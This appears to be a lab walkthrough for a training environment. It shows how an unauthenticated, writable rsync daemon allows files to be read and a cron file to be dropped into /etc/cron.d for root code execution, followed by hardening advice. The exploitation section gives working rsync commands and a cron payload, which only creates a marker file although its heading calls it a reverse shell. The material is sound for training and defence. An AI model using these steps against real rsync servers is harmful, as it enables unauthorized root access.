# Rsync Daemon Anonymous Module Access & Crontab Overwrite RCE

## Overview

Rsync is an open-source utility providing fast incremental file transfers. When configured in daemon mode without authentication (auth users omitted) and write access enabled (read only = false), unauthenticated network clients can list exposed modules, download arbitrary system files, and upload files directly into system directories. Overwriting /etc/cron.d/ or user crontabs yields instant remote code execution as root.

- **Service Access**: `http://localhost:8154/`
- **Default Credentials**: `Anonymous rsync module access`
- **Docker Shortcut**: `./lab start rsync-unauth`
- **Container Name**: `cyberlab_04_rsync_unauthorized_rce`
- **RAM Footprint**: ~50M

---

## Exploitation Walkthrough

### 1. Enumerate Exposed Rsync Modules

```bash
rsync --port=8154 127.0.0.1::
```

### 2. List Files in Writable Module

```bash
rsync --port=8154 -av 127.0.0.1::src/
```

### 3. Upload Malicious Reverse Shell Cron Job

```bash
echo '* * * * * root touch /tmp/pwned_rsync' > /tmp/evil_cron
rsync --port=8154 -av /tmp/evil_cron 127.0.0.1::src/etc/cron.d/evil_cron
```

### 4. Verify File Creation

```bash
docker exec -it cyberlab_04_rsync_unauthorized_rce ls -la /tmp/pwned_rsync
```

---

## Defensive Remediation & Hardening

1. Enable authentication in /etc/rsyncd.conf using auth users and secrets file.
2. Enforce read only = true on sensitive backup and synchronization modules.
3. Restrict access to port 873 using firewall rules.

---

## Video Walkthroughs & Technical References

- [Linux Privilege Escalation! | TryHackMe - Jr Penetration Tester](https://www.youtube.com/watch?v=vRMrk82Tvtk)
- [Rsync Security Best Practices](https://rsync.samba.org/documentation.html)
- [Vulhub Rsync Environment](https://vulhub.org/#/environments/rsync/common/)
